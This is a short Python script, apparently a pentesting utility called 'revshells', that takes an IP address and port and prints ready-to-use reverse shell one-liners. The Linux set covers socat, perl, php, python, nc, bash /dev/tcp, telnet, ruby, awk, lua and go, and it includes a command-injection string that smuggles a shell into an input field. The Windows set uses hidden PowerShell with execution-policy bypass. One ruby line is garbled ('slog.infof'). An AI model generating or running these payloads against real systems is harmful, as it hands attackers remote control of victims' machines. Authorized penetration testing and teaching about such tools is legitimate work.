#!/usr/bin/python
#revshells is a tool to quickly print a collection of reverse shells usign diferent commands and languajes
#by dplastico (thanks to vay3t for teh heads up)
# Mod by vay3t

import sys
import socket

def linux(ipDst,portDst):
    a = "socat TCP4:%s:%s EXEC:sh,pty,stderr,setsid,sigint,sane" %(ipDst,portDst)
    b = "perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" %(ipDst,portDst)
    c = "php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" %(ipDst,portDst)
    d = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" %(ipDst,portDst)
    e = "nc -e /bin/sh %s %s" %(ipDst,portDst)
    f = "sh -i >& /dev/tcp/%s/%s 0>&1" %(ipDst,portDst)
    g = "127.0.0.1;sh -i >& /dev/tcp/%s/%s 0>&1" %(ipDst,portDst)
    h = "/bin/telnet %s 80 | /bin/sh | /bin/telnet %s 25" %(ipDst,portDst)
    i = "mknod backpipe p && telnet %s %s 0<backpipe | /bin/sh 1>backpipe" %(ipDst,portDst)
    j = "mknod /var/tmp/fgp p ; /bin/sh 0</var/tmp/fgp |nc %s %s 1>/var/tmp/fgp" %(ipDst,portDst)
    k = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f " %(ipDst,portDst)
    l = "ruby -rsocket -e'f=TCPSocket.open(\"%s\",%s).to_i;exec slog.infof(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)'" %(ipDst,portDst)
    m = "exec 5<>/dev/tcp/%s/%s; while read line 0<&5; do $line 2>&5 >&5; done" %(ipDst,portDst)
    n = 'mknod /var/tmp/fgp p ; /bin/sh 0</var/tmp/fgp |nc %s %s 1>/var/tmp/fgp' %(ipDst,portDst)
    o = '0<&196;exec 196<>/dev/tcp/%s/%s; sh <&196 >&196 2>&196' %(ipDst,portDst)
    p = 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"%s:%s");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'' %(ipDst,portDst)
    q = 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("%s","%s");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'' %(ipDst,portDst)
    r = 'awk \'BEGIN {s = "/inet/tcp/0/%s>/%s"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null' %(ipDst,portDst)
    s = 'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'%s\',\'%s\');os.execute(\'/bin/sh -i <&3 >&3 2>&3\');"' %(ipDst,portDst)
    t = 'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","%s:%s");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go' %(ipDst,portDst)
    return [a,b,c,d,e,f,g,h,i,j,k,l,n,o,p,q,r,s,t]

def windows(ipDst,portDst):
    a = 'powershell.exe -nop -c \'$client = New-Object System.Net.Sockets.TCPClient(\"'+ipDst+'\",'+portDst+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%\{0\};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\''
    b = 'powershell.exe -c -nop "$c = New-Object System.Net.Sockets.TCPClient(\"'+ipDst+'\",'+portDst+');$str = $c.GetStream();[byte[]]$b = 0..65535|%\{0\};while(($i = $str.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sendback = (iex $d 2>&1 | Out-String );$sendback2 = $sendback + "PS"  + (pwd).Path + "> ";$sb = ([text.encoding]::ASCII).GetBytes($sendback2);$str.Write($sb,0,$sb.Length);$str.Flush()};$c.Close()"'
    c = 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("'+ipDst+'",'+portDst+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%\{0\};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    return [a,b,c]

def help():
    print("[!] usage: python "+sys.argv[0]+" <IP> <PORT>")

# usage
if len(sys.argv) != 3:
    help()
    sys.exit(1)

# Vars

ipDst = sys.argv[1]
portDst = int(sys.argv[2])

try:
    if 1 <= portDst <= 65535:
        pass
    else:
        raise ValueError
except ValueError:
    print("[!] Invalid Port")
    sys.exit(2)

# Validation
try:
    socket.inet_aton(ipDst)
except socket.error:
    print("[!] Invalid IP")
    sys.exit(2)

portDst = str(portDst)


# Printer
print("********* Linux *********")
for line in linux(ipDst,portDst):
    print("[\033[1;34m*\033[0m] "+line)
print("")
print("******** Windows ********")
for line in windows(ipDst,portDst):
    print("[\033[1;34m*\033[0m] "+line)
